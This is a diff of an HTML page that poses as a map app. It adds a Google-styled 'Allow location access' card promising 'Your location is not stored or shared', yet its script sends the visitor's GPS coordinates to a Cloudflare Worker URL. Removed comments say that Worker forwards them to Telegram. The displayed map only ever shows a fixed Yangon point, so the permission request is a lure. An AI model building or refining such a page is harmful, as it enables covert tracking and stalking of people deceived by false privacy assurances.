@@ -15,39 +15,151 @@ html, body {
   margin: 0;
   padding: 0;
   height: 100%;
+  font-family: Roboto, Arial, sans-serif;
+  background: #f1f3f4;
 }
 
+/* ===== Preview ===== */
+#preview {
+  position: absolute;
+  inset: 0;
+  background: linear-gradient(
+      rgba(0,0,0,.25),
+      rgba(0,0,0,.25)
+    ),
+    url("https://maps.googleapis.com/maps/api/staticmap?center=Yangon&zoom=13&size=600x800&maptype=roadmap")
+    center / cover no-repeat;
+}
+
+/* ===== Real Map ===== */
 #map {
   height: 100vh;
   width: 100%;
   display: none;
 }
 
-#notice {
-  height: 100vh;
+/* ===== Overlay ===== */
+#overlay {
+  position: absolute;
+  inset: 0;
   display: flex;
-  align-items: center;
+  align-items: flex-end;
   justify-content: center;
-  font-family: Arial, sans-serif;
-  font-size: 20px;
+}
+
+/* ===== Card ===== */
+#card {
+  background: #fff;
+  width: 94%;
+  max-width: 440px;
+  border-radius: 16px;
+  padding: 18px;
+  margin-bottom: 20px;
+  box-shadow: 0 10px 28px rgba(0,0,0,.25);
+  animation: slideUp .5s ease;
+}
+
+#card h3 {
+  margin: 0;
+  font-size: 17px;
+  color: #202124;
+}
+
+#card p {
+  margin: 8px 0;
+  font-size: 13px;
+  color: #5f6368;
+  line-height: 1.4;
+}
+
+#trust {
+  font-size: 12px;
+  color: #1e8e3e;
+  margin-top: 6px;
+}
+
+/* ===== Button ===== */
+button {
+  width: 100%;
+  padding: 14px;
+  margin-top: 14px;
+  border: none;
+  border-radius: 24px;
+  background: #1a73e8;
+  color: #fff;
+  font-size: 15px;
+  font-weight: 500;
+  cursor: pointer;
+}
+
+button:disabled {
+  background: #c6c6c6;
+  cursor: not-allowed;
+}
+
+/* ===== Loader ===== */
+#loader {
+  margin: 14px auto 0;
+  width: 26px;
+  height: 26px;
+  border: 3px solid #ddd;
+  border-top: 3px solid #1a73e8;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  display: none;
+}
+
+/* ===== Animations ===== */
+@keyframes slideUp {
+  from { transform: translateY(40px); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
 }
 </style>
 </head>
 
 <body>
 
-<div id="notice">📍 Open Location</div>
+<!-- Preview background -->
+<div id="preview"></div>
+
+<!-- Real map -->
 <div id="map"></div>
+
+<!-- Trust card -->
+<div id="overlay">
+  <div id="card">
+    <h3>Allow location access</h3>
+
+    <p>
+      We use your location to show nearby map information
+      and improve accuracy.
+    </p>
+
+    <p id="statusText">
+      Please turn on GPS (Location Services) to continue.
+    </p>
+
+    <div id="trust">
+      🔒 Your location is not stored or shared.
+    </div>
+
+    <button id="actionBtn" onclick="startLocation()" disabled>
+      Continue
+    </button>
+
+    <div id="loader"></div>
+  </div>
+</div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
 <script>
 /* ================= CONFIG ================= */
-
-// 🔁 မင်း Worker URL ကို ဒီနေရာမှာပဲ ထည့်
 const WORKER_URL = "https://empty-bar-fafc.freetextingacc001.workers.dev";
-
-// Yangon meeting point (မပြောင်း)
 const YANGON_POINT = { lat: 16.7746, lng: 96.1581 };
 
 /* ================= SEND TO WORKER ================= */
@@ -55,48 +167,68 @@ function sendToWorker(lat, lng) {
   fetch(WORKER_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      lat: lat,
-      lng: lng
-    })
+    body: JSON.stringify({ lat, lng })
   });
 }
 
-/* ================= LOCATION ================= */
-if (navigator.geolocation) {
+/* ================= MAP ================= */
+function showMap(lat, lng) {
+  document.getElementById("overlay").style.display = "none";
+  document.getElementById("preview").style.display = "none";
+  document.getElementById("map").style.display = "block";
+
+  const map = L.map("map").setView([lat, lng], 15);
+
+  L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+    attribution: "© OpenStreetMap"
+  }).addTo(map);
+
+  L.marker([lat, lng]).addTo(map);
+}
+
+/* ================= GPS CHECK ================= */
+function checkGPS() {
+  if (!navigator.geolocation) {
+    document.getElementById("statusText").innerText =
+      "Geolocation is not supported on this device.";
+    return;
+  }
+
+  navigator.permissions.query({ name: "geolocation" }).then(result => {
+    if (result.state === "granted" || result.state === "prompt") {
+      document.getElementById("statusText").innerText =
+        "Location is available. Allow access to continue.";
+      document.getElementById("actionBtn").disabled = false;
+    } else {
+      document.getElementById("statusText").innerText =
+        "Location access is blocked. Enable GPS in browser settings.";
+    }
+  });
+}
+
+/* ================= LOCATION FLOW ================= */
+function startLocation() {
+  document.getElementById("actionBtn").style.display = "none";
+  document.getElementById("loader").style.display = "block";
+
   navigator.geolocation.getCurrentPosition(
     pos => {
-      // ✅ Allow
-      document.getElementById("notice").style.display = "none";
-      document.getElementById("map").style.display = "block";
-
-      const map = L.map("map").setView(
-        [YANGON_POINT.lat, YANGON_POINT.lng],
-        15
-      );
-
-      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
-        attribution: "© OpenStreetMap"
-      }).addTo(map);
-
-      // Yangon marker only
-      L.marker([YANGON_POINT.lat, YANGON_POINT.lng]).addTo(map);
-
-      // 📤 Send user location → Worker → Telegram
       const lat = pos.coords.latitude;
       const lng = pos.coords.longitude;
 
+      showMap(YANGON_POINT.lat, YANGON_POINT.lng);
       sendToWorker(lat, lng);
     },
     () => {
-      // ❌ Deny
-      document.getElementById("notice").innerText = "📍 Open Location";
+      showMap(YANGON_POINT.lat, YANGON_POINT.lng);
     }
   );
-} else {
-  document.getElementById("notice").innerText = "📍 Open Location";
 }
+
+/* ================= INIT ================= */
+checkGPS();
 </script>
 
 </body>
 </html>
+
